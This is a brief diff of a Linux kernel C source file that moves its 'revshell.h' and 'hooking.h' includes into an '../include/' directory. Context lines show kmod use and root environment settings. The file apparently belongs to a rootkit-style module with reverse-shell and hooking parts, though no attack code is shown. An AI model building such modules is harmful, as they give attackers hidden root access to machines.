@@ -3,8 +3,8 @@
 #include <linux/kmod.h>
 #include <linux/kernel.h>
 
-#include "revshell.h"
-#include "hooking.h"
+#include "../include/revshell.h"
+#include "../include/hooking.h"
 
 #define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
 #define HOME "HOME=/root"
